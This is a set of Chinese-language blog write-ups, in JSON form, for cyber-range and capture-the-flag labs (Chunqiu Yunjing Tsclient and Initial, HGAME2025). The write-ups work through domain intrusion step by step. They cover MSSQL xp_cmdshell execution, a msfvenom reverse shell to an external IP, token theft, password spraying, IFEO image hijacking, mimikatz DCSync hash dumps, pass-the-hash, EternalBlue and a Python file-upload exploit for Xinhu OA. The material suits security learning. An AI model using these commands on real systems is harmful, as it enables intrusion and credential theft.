alt=\"image-20250206151704506\" loading=\"lazy\" src=\"../assets/image-20250206151704506.png\"\u003e\u003c/p\u003e\n\u003cp\u003e一个小游戏，猜测应该是js审计\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206151846623\" loading=\"lazy\" src=\"../assets/image-20250206151846623.png\"\u003e\u003c/p\u003e\n\u003cp\u003e查看index.js发现代码进行了混淆\u003c/p\u003e\n\u003cp\u003e可以用工具反混淆一下，增加一下可读性\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://tool.yuanrenxue.cn/decode_obfuscator\"\u003ehttps://tool.yuanrenxue.cn/decode_obfuscator\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152531656\" loading=\"lazy\" src=\"../assets/image-20250206152531656.png\"\u003e\u003c/p\u003e\n\u003cp\u003e反混淆之后找到这个\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250206152608227\" loading=\"lazy\" src=\"../assets/image-20250206152608227.png\"\u003e\u003c/p\u003e","title":"HGAME2025 WEEK1"},{"content":"","permalink":"http://localhost:1313/about/","summary":"about","title":"关于"},{"content":"Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\n参考文章\n春秋云镜 TSclient \u0026ndash; Walkthrough - KingBridge - 博客园\n春秋云境 Tsclient | 初零·b10g~🥝\nFLAG1 先用fscan扫一下\nmssql服务是弱口令\nsa/1qaz!QAZ 用数据库管理工具连上去\n接下来要看mssql怎么进行命令执行\n参考文章：\nhttps://xz.aliyun.com/news/7129\n判断xp_cmdshell状态\nselect * from master.dbo.sysobjects where xtype=\u0026#39;x\u0026#39; and name=\u0026#39;xp_cmdshell\u0026#39; 存在\n那我们接下来启动它\nEXEC sp_configure \u0026#39;show advanced options\u0026#39;, 1;RECONFIGURE;EXEC sp_configure \u0026#39;xp_cmdshell\u0026#39;, 1;RECONFIGURE; 配置选项 \u0026#39;xp_cmdshell\u0026#39; 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。 启动成功\n接下来就可以进行命令执行了\nexec master..xp_cmdshell \u0026#39;whoami\u0026#39; 接下来直接vshell一句话上线\n没找到flag，发现Administrator文件夹没有权限\n想到要提权，传一个PrintSpoofer进行提权\nhttps://github.com/whojeff/PrintSpoofer\n1PrintSpoofer.exe -i -c cmd 提权之后拿到flag\n1C:\\Tmp\u0026gt;type C:\\Users\\Administrator\\flag\\flag01.txt 2 _________ ________ ________ ___ ___ _______ ________ _________ 3|\\___ ___\\\\ ____\\|\\ ____\\|\\ \\ |\\ \\|\\ ___ \\ |\\ ___ \\|\\___ ___\\ 4\\|___ \\ \\_\\ \\ \\___|\\ \\ \\___|\\ \\ \\ \\ \\ \\ \\ __/|\\ \\ \\\\ \\ \\|___ \\ \\_| 5 \\ \\ \\ \\ \\_____ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\_|/_\\ \\ \\\\ \\ \\ \\ \\ \\ 6 \\ \\ \\ \\|____|\\ \\ \\ \\____\\ \\ \\____\\ \\ \\ \\ \\_|\\ \\ \\ \\\\ \\ \\ \\ \\ \\ 7 \\ \\__\\ ____\\_\\ \\ \\_______\\ \\_______\\ \\__\\ \\_______\\ \\__\\\\ \\__\\ \\ \\__\\ 8 \\|__| |\\_________\\|_______|\\|_______|\\|__|\\|_______|\\|__| \\|__| \\|__| 9 \\|_________| 10 11 12Getting flag01 is easy, right? 13 14flag01: flag{5ee60dcf-4f7b-4e2a-977e-cbf1697d8df4} 15 16 17Maybe you should focus on user sessions... 提权之后用提权后的账户重新上一下线\n接下来用fscan扫一下内网\n1┌──────────────────────────────────────────────┐ 2│ ___ _ │ 3│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 4│ / /_\\/____/ __|/ __| \u0026#39;__/ _` |/ __| |/ / │ 5│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u0026lt; │ 6│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 7└──────────────────────────────────────────────┘ 8 Fscan Version: 2.0.0 9 10[2025-03-09 19:53:19] [INFO] 暴力破解线程数: 1 11[2025-03-09 19:53:19] [INFO] 开始信息扫描 12[2025-03-09 19:53:19] [INFO] CIDR范围: 172.22.8.0-172.22.8.255 13[2025-03-09 19:53:20] [INFO] 生成IP范围: 172.22.8.0.%!d(string=172.22.8.255) - %!s(MISSING).%!d(MISSING) 14[2025-03-09 19:53:20] [INFO] 解析CIDR 172.22.8.0/24 -\u0026gt; IP范围 172.22.8.0-172.22.8.255 15[2025-03-09 19:53:20] [INFO] 最终有效主机数量: 256 16[2025-03-09 19:53:20] [INFO] 开始主机扫描 17[2025-03-09 19:53:20] [INFO] 正在尝试无监听ICMP探测... 18[2025-03-09 19:53:20] [INFO] 当前用户权限不足,无法发送ICMP包 19[2025-03-09 19:53:20] [INFO] 切换为PING方式探测... 20[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.31 存活 (ICMP) 21[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.18 存活 (ICMP) 22[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.15 存活 (ICMP) 23[2025-03-09 19:53:20] [SUCCESS] 目标 172.22.8.46 存活 (ICMP) 24[2025-03-09 19:53:23] [INFO] 存活主机数量: 4 25[2025-03-09 19:53:23] [INFO] 有效端口数量: 233 26[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.15:88 27[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.46:80 28[2025-03-09 19:53:23] [SUCCESS] 端口开放 172.22.8.18:80 29[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:139 30[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:139 31[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:135 32[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:135 33[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:135 34[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:135 35[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:139 36[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:139 37[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.46:445 38[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:445 39[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.31:445 40[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.18:445 41[2025-03-09 19:53:24] [SUCCESS] 端口开放 172.22.8.15:389 42[2025-03-09 19:53:26] [SUCCESS] 端口开放 172.22.8.18:1433 43[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.15:88 =\u0026gt; 44[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.46:80 =\u0026gt; [http] 45[2025-03-09 19:53:28] [SUCCESS] 服务识别 172.22.8.18:80 =\u0026gt; [http] 46[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.18:139 =\u0026gt; Banner:[.] 47[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.31:139 =\u0026gt; Banner:[.] 48[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.46:139 =\u0026gt; Banner:[.] 49[2025-03-09 19:53:29] [SUCCESS] 服务识别 172.22.8.15:139 =\u0026gt; Banner:[.] 50[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.46:445 =\u0026gt; 51[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.15:445 =\u0026gt; 52[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.31:445 =\u0026gt; 53[2025-03-09 19:53:30] [SUCCESS] 服务识别 172.22.8.18:445 =\u0026gt; 54[2025-03-09 19:53:31] [SUCCESS] 服务识别 172.22.8.18:1433 =\u0026gt; [ms-sql-s] 版本:13.00.1601 产品:Microsoft SQL Server 2016 系统:Windows Banner:[.%.A.] 55[2025-03-09 19:53:35] [SUCCESS] 服务识别 172.22.8.15:389 =\u0026gt; 56[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.15:135 =\u0026gt; 57[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.46:135 =\u0026gt; 58[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.31:135 =\u0026gt; 59[2025-03-09 19:54:29] [SUCCESS] 服务识别 172.22.8.18:135 =\u0026gt; 60[2025-03-09 19:54:29] [INFO] 存活端口数量: 17 61[2025-03-09 19:54:30] [INFO] 开始漏洞扫描 62[2025-03-09 19:54:30] [INFO] 加载的插件: findnet, ldap, ms17010, mssql, netbios, smb, smb2, smbghost, webpoc, webtitle 63[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 64目标主机: 172.22.8.18 65主机名: WIN-WEB 66发现的网络接口: 67 IPv4地址: 68 └─ 172.22.8.18 69 IPv6地址: 70 └─ 2001:0:348b:fb58:1445:3719:d89d:8092 71[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT 72[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 73目标主机: 172.22.8.15 74主机名: DC01 75发现的网络接口: 76 IPv4地址: 77 └─ 172.22.8.15 78[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 79目标主机: 172.22.8.46 80主机名: WIN2016 81发现的网络接口: 82 IPv4地址: 83 └─ 172.22.8.46 84[2025-03-09 19:54:30] [SUCCESS] NetInfo 扫描结果 85目标主机: 172.22.8.31 86主机名: WIN19-CLIENT 87发现的网络接口: 88 IPv4地址: 89 └─ 172.22.8.31 90[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.46 WIN2016.xiaorang.lab Windows Server 2016 Datacenter 14393 91[2025-03-09 19:54:30] [SUCCESS] NetBios 172.22.8.15 DC:XIAORANG\\DC01 92[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.46 状态码:200 长度:703 标题:IIS Windows Server 93[2025-03-09 19:54:30] [SUCCESS] 网站标题 http://172.22.8.18 状态码:200 长度:703 标题:IIS Windows Server 94[2025-03-09 19:54:31] [SUCCESS] MSSQL 172.22.8.18:1433 sa 1qaz!QAZ 95[2025-03-09 19:54:53] [SUCCESS] 扫描已完成: 32/32 扫到三台机子\nNetBios 172.22.8.46 WIN2016.xiaorang.lab NetBios 172.22.8.31 XIAORANG\\WIN19-CLIENT\rNetBios 172.22.8.15 DC:XIAORANG\\DC01 没有什么能直接利用的服务\n那我们接着信息收集一下\nnet user 主机名: WIN-WEB\rOS 名称: Microsoft Windows Server 2016 Datacenter\rOS 版本: 10.0.14393 暂缺 Build 14393\rOS 制造商: Microsoft Corporation\rOS 配置: 独立服务器\rOS 构件类型: Multiprocessor Free\r注册的所有人:\r注册的组织: Aliyun\r产品 ID: 00376-40000-00000-AA947\r初始安装日期: 2022/7/11, 12:46:14\r系统启动时间: 2025/3/9, 18:28:29\r系统制造商: Alibaba Cloud\r系统型号: Alibaba Cloud ECS\r系统类型: x64-based PC\r处理器: 安装了 1 个处理器。\r[01]: Intel64 Family 6 Model 85 Stepping 7 GenuineIntel ~2500 Mhz\rBIOS 版本: SeaBIOS 449e491, 2014/4/1\rWindows 目录: C:\\Windows\r系统目录: C:\\Windows\\system32\r启动设备: \\Device\\HarddiskVolume1\r系统区域设置: zh-cn;中文(中国)\r输入法区域设置: zh-cn;中文(中国)\r时区: (UTC+08:00) 北京，重庆，香港特别行政区，乌鲁木齐\r物理内存总量: 3,950 MB\r可用的物理内存: 883 MB\r虚拟内存: 最大值: 5,848 MB\r虚拟内存: 可用: 1,169 MB\r虚拟内存: 使用中: 4,679 MB\r页面文件位置: C:\\pagefile.sys\r域: WORKGROUP\r登录服务器: 暂缺\r修补程序: 安装了 6 个修补程序。\r[01]: KB5013625\r[02]: KB4049065\r[03]: KB4486129\r[04]: KB4486131\r[05]: KB5014026\r[06]: KB5013952\r网卡: 安装了 1 个 NIC。\r[01]: Red Hat VirtIO Ethernet Adapter\r连接名: 以太网\r启用 DHCP: 是\rDHCP 服务器: 172.22.255.253\rIP 地址\r[01]: 172.22.8.18\r[02]: fe80::205a:dd47:2165:6397\rHyper-V 要求: 已检测到虚拟机监控程序。将不显示 Hyper-V 所需的功能。 C:\\Tmp\u0026gt;net user\r\\\\ 的用户帐户\r-------------------------------------------------------------------------------\rAdministrator DefaultAccount Guest\rJohn test\r命令运行完毕，但发生一个或多个错误。 C:\\Tmp\u0026gt;quser\r用户名 会话名 ID 状态 空闲时间 登录时间\rjohn rdp-tcp#0 2 运行中 2:38 2025/3/9 18:30 发现一个john用户远程连接本台机子\n为了方便可以新建一个用户rdp连上去\nC:\\Tmp\u0026gt;net user xrntkk Abc20060201 /add\r命令成功完成。\rC:\\Tmp\u0026gt;net localgroup administrators xrntkk /add\r命令成功完成。\rC:\\Tmp\u0026gt;REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u0026#34; \u0026#34;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f\r操作成功完成。 管理员权限可以偷RDP用户的token，从而查看其挂载的盘。\n这里可以用msf的incognito模块\nubuntu@VM-20-9-ubuntu:~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=106.55.168.231 LPORT=9999 -f exe -o msf.exe\r[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload[-] No arch selected, selecting arch: x64 from the payload\rNo encoder specified, outputting raw payload\rPayload size: 510 bytes\rFinal size of exe file: 7168 bytes\rSaved as: msf.exe 先用msf上个线\nmsfconsole\ruse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 106.55.168.231\rset lport 9999\rexploit 上线\n接着用incognito模块偷John的token\n1meterpreter \u0026gt; use incognito 2Loading extension incognito...Success. 3meterpreter \u0026gt; list_tokens -u 4 5Delegation Tokens Available 6======================================== 7IIS APPPOOL\\DefaultAppPool 8NT AUTHORITY\\LOCAL SERVICE 9NT AUTHORITY\\NETWORK SERVICE 10NT AUTHORITY\\SYSTEM 11NT SERVICE\\MsDtsServer130 12NT SERVICE\\MSSQLFDLauncher 13NT SERVICE\\MSSQLSERVER 14NT SERVICE\\MSSQLServerOLAPService 15NT SERVICE\\ReportServer 16NT SERVICE\\SQLTELEMETRY 17NT SERVICE\\SSASTELEMETRY 18NT SERVICE\\SSISTELEMETRY130 19WIN-WEB\\John 20WIN-WEB\\test 21WIN-WEB\\xrntkk 22Window Manager\\DWM-1 23Window Manager\\DWM-2 24Window Manager\\DWM-3 25Window Manager\\DWM-4 26 27Impersonation Tokens Available 28======================================== 29No tokens available 可以看到已经拿到John的token了\n以John的身份运行cmd\n1meterpreter \u0026gt; impersonate_token WIN-WEB\\\\John 2[+] Delegation token available 3[+] Successfully impersonated user WIN-WEB\\John 4meterpreter \u0026gt; shell 5Process 7508 created. 6Channel 1 created. 7... 8 9C:\\Tmp\u0026gt;whoami 10whoami 11win-web\\john net use 看一下挂载情况（不知道为啥我这乱码了）\n挂载了c盘\n查看c盘中的credential.txt文件\nC:\\Tmp\u0026gt;type \\\\TSCLIENT\\C\\credential.txt\rtype \\\\TSCLIENT\\C\\credential.txt\rxiaorang.lab\\Aldrich:Ald@rLMWuy7Z!#\rDo you know how to hijack Image? 这里有一串账号密码，用这串账号密码进行一个密码喷洒\ncrackmapexec -q smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Z!# ┌──(root㉿Xrntkk-Laptop)-[/home/xrntkk]\r└─# proxychains4 -q crackmapexec smb 172.22.8.0/24 -u Aldrich -p Ald@rLMWuy7Zproxychains4 crackmapexec smb 172.22.8.0/24\r-u Aldrich -p Ald@rLMWuy7Z\rSMB 172.22.8.18 445 WIN-WEB [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:WIN-WEB) (signing:False) (SMBv1:True)\rSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.46 445 WIN2016 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)\rSMB 172.22.8.18 445 WIN-WEB [-] WIN-WEB\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.31 445 WIN19-CLIENT [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE\rSMB 172.22.8.15 445 DC01 [-] xiaorang.lab\\Aldrich:Ald@rLMWuy7Z STATUS_LOGON_FAILURE 可以看到这三台机貌似都能登上去\nSMB 172.22.8.46 445 WIN2016 [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)\rSMB 172.22.8.31 445 WIN19-CLIENT [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)\rSMB 172.22.8.15 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False) 我这里选择登31\nproxychains4 rdesktop 172.22.8.31 -u Aldrich -d xiaorang.lab -p \u0026#39;Ald@rLMWuy7Z!#\u0026#39; 这里要用rdesktop登，rdp登不上\n会提示密码过期，改个密码就行了\n但是改完密码这台机还是登不上，没有登陆权限\n所以我们尝试用这个修改后的账号密码再去登这个账号的另一台机子\n成功在46中登入，后面还是用rdp吧，rdesktop也太卡了\nxiaorang.lab\\Aldrich\rAbc123456 FLAG2 信息收集一下\n可以看到我们已经拿下域内的一台机子了\nsysteminfo 这台机子不出网，我们可以通过共享文件夹的方式来传文件\n这里我是用第一台机子(172.22.8.18)，将文件夹C:/xrntkk共享给(172.22.8.46)\n在46上Win+R并输入\n\\\\172.22.8.18 输入18共享文件的账号密码即可\n接着我们用bloodhound来进行一下域内信息收集\nSharpHound.exe -c all 将数据采集完生成的zip文件，上传导入到BloodHound分析\n从图中，我们会发现46这台机子的用户是域管，那我们接下来就要想办法在这台机子上提权，然后拿下域控\n根据前面的hint\nDo you know how to hijack Image? 我们可以知道接下来要进行镜像劫持(IFEO)提权\nGet-ACL -Path \u0026#34;HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\u0026#34; | fl 这条命令的意思是获取指定注册表路径的访问控制列表（ACL）。\nNT AUTHORITY\\Authenticated Users 我们可以发现全部已登录用户都可以对注册表进行修改\n那我们就可以通过修改注册表进行映像劫持\n我们这里通过将放大镜启动的magnify.exe替换成C:\\windows\\system32\\cmd.exe，来进行提权\n1REG ADD \u0026#34;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\magnify.exe\u0026#34; /v Debugger /t REG_SZ /d \u0026#34;C:\\windows\\system32\\cmd.exe\u0026#34; 修改后选择锁定\n在锁定页面选择放大镜即可\ntype c:\\Users\\Administrator\\flag\\flag02.txt 接着我们可以新建一个用户让rdp可以连上去\nFLAG3 接下来就是常规的将域内用户的哈希dump下来\nmimikatz.exe \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit \u0026gt; mimikatz.txt 结果\n.#####. mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08\r.## ^ ##. \u0026#34;A La Vie, A L\u0026#39;Amour\u0026#34; - (oe.eo)\r## / \\ ## /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\r## \\ / ## \u0026gt; https://blog.gentilkiwi.com/mimikatz\r\u0026#39;## v ##\u0026#39; Vincent LE TOUX ( vincent.letoux@gmail.com )\r\u0026#39;#####\u0026#39; \u0026gt; https://pingcastle.com / https://mysmartlogon.com ***/\rmimikatz(commandline) # lsadump::dcsync /domain:xiaorang.lab /all /csv\r[DC] \u0026#39;xiaorang.lab\u0026#39; will be the domain\r[DC] \u0026#39;DC01.xiaorang.lab\u0026#39; will be the DC server\r[DC] Exporting domain \u0026#39;xiaorang.lab\u0026#39;\r[rpc] Service : ldap\r[rpc] AuthnSvc : GSS_NEGOTIATE (9)\r502\tkrbtgt\t3ffd5b58b4a6328659a606c3ea6f9b63\t514\r1000\tDC01$\t7408967f1fd3c2ff807232b7b5c5fc95\t532480\r500\tAdministrator\t2c9d81bdcf3ec8b1def10328a7cc2f08\t512\r1103\tWIN2016$\taae3dca76f254c52708ee076935bb533\t16781312\r1104\tWIN19-CLIENT$\t7c011200ecbe666945e465c200afcb5e\t16781312\r1105\tAldrich\t0607f770c2f37e09a850e09e920a9f45\t512\rmimikatz(commandline) # exit\rBye! 之后就可以进行横向移动了\nproxychains4 impacket-smbexec -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 xiaorang.lab/administrator@172.22.8.15 -codec gbk type c:\\users\\administrator\\flag\\flag03.txt 拿到最后一个flag\nC:\\Windows\\system32\u0026gt;type c:\\users\\administrator\\flag\\flag03.txt\r_________ __ _ _\r| _ _ | [ | (_) / |_\r|_/ | | \\_|.--. .---. | | __ .---. _ .--. `| |-\u0026#39;\r| | ( (`\\] / /\u0026#39;`\\] | | [ |/ /__\\\\[ `.-. | | |\r_| |_ `\u0026#39;.\u0026#39;. | \\__. | | | || \\__., | | | | | |,\r|_____| [\\__) )\u0026#39;.___.\u0026#39;[___][___]\u0026#39;.__.\u0026#39;[___||__]\\__/\rCongratulations! ! !\rflag03: flag{410202d3-2e47-4619-a6b0-96051a985f2e} 这题用cs打会方便很多，但是一开始没考虑到，所以后面也一直没用。\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-tsclient-writeup/","summary":"\u003cp\u003eTsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。\u003c/p\u003e","title":"春秋云镜-Tsclient-Writeup"},{"content":" 参考文章\nhttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\n菜鸡第一个通关的靶场Orz\nFLAG1 fscan扫一下\n./fscan.exe -h 39.99.139.119 直接用thinkphpgui写马连蚁剑\n先用vshell上线\n读flag需要提权\npeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\n传个linpeas扫一下\n./linpeas_linux_amd64 \u0026gt; output.txt 在历史文件中找到疑似读flag的命令\n其实这就是一个简单的sudo提权\n渗透测试：Linux提权精讲（三）之sudo方法第三期_nmap sudo 提权-CSDN博客\nmysql 是配置了 sudo 免密使用的，可以使用 mysql 提权，通过mysql执行命令来读flag\npayload:\nsudo mysql -e \u0026#39;\\! /bin/sh\u0026#39;\rcat /root/flag/flag* flag01: flag{60b53231- 接下来搭代理\n查内网ip\n接着传一个fscan扫一下内网\nfs -h 172.22.1.0/24 -nobr -nopoc -hn 172.22.1.15 收集到的信息\n172.22.1.2:DC域控\r172.22.1.21:Windows的机器并且存在MS17-010 漏洞\r172.22.1.18:信呼OA办公系统 FLAG2 先看信呼\n弱口令成功登入admin/admin123\n信呼协同办公系统v2.2.8存在文件上传漏洞\n[Awesome-POC/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md at master · Threekiii/Awesome-POC](https://github.com/Threekiii/Awesome-POC/blob/master/OA产品漏洞/信呼OA qcloudCosAction.php 任意文件上传漏洞.md)\n1import requests 2 3session = requests.session() 4url_pre = \u0026#39;http://172.22.1.18/\u0026#39; 5url1 = url_pre + \u0026#39;?a=check\u0026amp;m=login\u0026amp;d=\u0026amp;ajaxbool=true\u0026amp;rnd=533953\u0026#39; 6url2 = url_pre + \u0026#39;/index.php?a=upfile\u0026amp;m=upload\u0026amp;d=public\u0026amp;maxsize=100\u0026amp;ajaxbool=true\u0026amp;rnd=798913\u0026#39; 7# url3 = url_pre + \u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid=\u0026lt;ID\u0026gt;\u0026#39; 8data1 = { 9 \u0026#39;rempass\u0026#39;: \u0026#39;0\u0026#39;, 10 \u0026#39;jmpass\u0026#39;: \u0026#39;false\u0026#39;, 11 \u0026#39;device\u0026#39;: \u0026#39;1625884034525\u0026#39;, 12 \u0026#39;ltype\u0026#39;: \u0026#39;0\u0026#39;, 13 \u0026#39;adminuser\u0026#39;: \u0026#39;YWRtaW4=\u0026#39;, 14 \u0026#39;adminpass\u0026#39;: \u0026#39;YWRtaW4xMjM=\u0026#39;, 15 \u0026#39;yanzm\u0026#39;: \u0026#39;\u0026#39; 16} 17 18r = session.post(url1, data=data1) 19r = session.post(url2, files={\u0026#39;file\u0026#39;: open(\u0026#39;1.php\u0026#39;, \u0026#39;r\u0026#39;)}) 20filepath = str(r.json()[\u0026#39;filepath\u0026#39;]) 21filepath = \u0026#34;/\u0026#34; + filepath.split(\u0026#39;.uptemp\u0026#39;)[0] + \u0026#39;.php\u0026#39; 22print(filepath) 23id = r.json()[\u0026#39;id\u0026#39;] 24url3 = url_pre + f\u0026#39;/task.php?m=qcloudCos|runt\u0026amp;a=run\u0026amp;fileid={id}\u0026#39; 25r = session.get(url3) 26r = session.get(url_pre + filepath + \u0026#34;?1=system(\u0026#39;dir\u0026#39;);\u0026#34;) 27print(r.text) 写马之后直接读flag就行\nflag02: 2ce3-4813-87d4- FLAG3 永恒之蓝可以用msf打\n现在kali上用proxychains4简单配个代理\nproxychains4 msfconsole\rsearch ms17-010 有四个不同的模块\n这里使用第一个模块，因为利用范围比较广\nuse exploit/windows/smb/ms17_010_eternalblue # 选择使用的模块\rset payload windows/x64/meterpreter/bind_tcp_uuid # 设置payload，可以通过show payloads查看\rset RHOSTS 172.22.1.21 # 设置靶机的ip\rexploit # 发起攻击 成功了\nmeterpreter \u0026gt; screenshot # 捕获屏幕\rmeterpreter \u0026gt; upload hello.txt c:// #上传文件\rmeterpreter \u0026gt; download d://1.txt # 下载文件\rmeterpreter \u0026gt; shell # 获取cmd\rmeterpreter \u0026gt; clearev # 清除日志 load kiwi # 调用mimikatz模块\rkiwi_cmd \u0026#34;lsadump::dcsync /domain:xiaorang.lab /all /csv\u0026#34; exit # 导出域内所有用户的信息(包括哈希值) 拿到Administrator 用户的 hash，接着使用 crackmapexec 来进行哈希传递攻击，来实现 DC域控 上的任意命令执行\nproxychains4 crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x \u0026#34;type Users\\Administrator\\flag\\flag03.txt\u0026#34; 拿到最后一个flag\n","permalink":"http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-initial-writeup/","summary":"\u003cblockquote\u003e\n\u003cp\u003e参考文章\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\"\u003ehttps://9anux.org/2024/08/01/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial%E8%AF%A6%E8%A7%A3/\u003c/a\u003e\u003c/p\u003e\u003c/blockquote\u003e\n\u003cp\u003e菜鸡第一个通关的靶场Orz\u003c/p\u003e\n\u003ch3 id=\"flag1\"\u003eFLAG1\u003c/h3\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306184027336\" loading=\"lazy\" src=\"./assets/image-20250306184027336.png\"\u003e\u003c/p\u003e\n\u003cp\u003efscan扫一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e./fscan.exe -h 39.99.139.119\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e\u003cimg alt=\"image-20250306184106697\" loading=\"lazy\" src=\"./assets/image-20250306184106697.png\"\u003e\u003c/p\u003e\n\u003cp\u003e直接用thinkphpgui写马连蚁剑\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20250306185409381\" loading=\"lazy\" src=\"./assets/image-20250306185409381.png\"\u003e\u003c/p\u003e\n\u003cp\u003e先用vshell上线\u003c/p\u003e\n\u003cp\u003e读flag需要提权\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/peass-ng/PEASS-ng\"\u003epeass-ng/PEASS-ng: PEASS - Privilege Escalation Awesome Scripts SUITE (with colors)\u003c/a\u003e\u003c/p\u003e","title":"春秋云镜-Initial-Writeup"},{"content":"Web week1 Level 24 Pacman 拿到环境\n一个小游戏，猜测应该是js审计\n查看index.js发现代码进行了混淆\n可以用工具反混淆一下，增加一下可读性\nhttps://tool.yuanrenxue.cn/decode_obfuscator\n反混淆之后找到这个\n感觉是栅栏，解密拿到flag\nLevel 47 BandBomb 文件上传\n附件有源码\n1const express = require(\u0026#39;express\u0026#39;); 2const multer = require(\u0026#39;multer\u0026#39;); 3const fs = require(\u0026#39;fs\u0026#39;); 4const path = require(\u0026#39;path\u0026#39;); 5 6const app = express(); 7 8app.set(\u0026#39;view engine\u0026#39;, \u0026#39;ejs\u0026#39;); 